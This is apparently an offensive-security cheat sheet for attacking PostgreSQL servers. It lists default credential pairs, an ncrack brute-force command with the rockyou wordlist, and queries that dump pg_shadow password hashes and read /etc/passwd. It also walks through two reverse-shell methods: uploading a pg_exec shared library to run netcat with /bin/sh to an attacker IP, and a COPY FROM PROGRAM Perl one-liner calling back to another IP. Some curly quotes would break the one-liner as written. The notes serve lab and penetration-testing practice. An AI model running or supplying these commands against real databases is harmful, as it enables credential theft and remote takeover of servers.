#### default postgresql credentials
```bash
    postgres : postgres
    postgres : password
    postgres : admin
    admin : admin
    admin : password
```


#### bruteforce postgresql
```bash
ncrack psql://sqlserver -u postgres -P /usr/share/wordlists/rockyou.txt
```


#### postgresql emumeration
[walkthrough example](https://www.trenchesofit.com/2021/02/01/offensive-security-proving-grounds-nibbles-write-up-no-metasploit/)

```bash
postgres>
    SELECT usename, passwd FROM pg_shadow —priv;
    select pg_read_file('/etc/passwd');
    select pg_ls_dir('/home/username');
    \du
    \l
    select pg_ls_dir('./');
    select pg_read_file('postgresql.auto.conf', 66, 12);
    create table passwd (data TEXT);
        copy docs from '/etc/passwd';
```

#### postgresql reverse shell
```bash
select version();
    curl https://github.com/Dionach/pgexec/blob/master/libraries/pg_exec-9.6.so -O pg_exec.so
    select lo_creat(-1); # used in LOID
    split -b 2048 pg_exec.so
    CNT=0; for f in x*; do echo '\set c'${CNT}' `base64 -w 0 '${f}'`'; echo 'INSERT INTO pg_largeobject (loid, pageno, data) values ('${LOID}', '${CNT}', decode(:'"'"c${CNT}"'"', '"'"'base64'"'"'));'; CNT=$(( CNT + 1 )); done > upload.sql
    \include upload.sql
    select lo_export(16391, '/tmp/pg_exec.so');
    CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
    # nc -l -p 4444
    select sys('nc -e /bin/sh 172.16.65.140 4444');
    python -c 'import pty; pty.spawn("/bin/sh")'
```
```bash
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM ‘id’;
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

> oneliner
```bash
COPY files FROM PROGRAM ‘perl -MIO -e ‘’$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”192.168.49.214:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’’’;

```


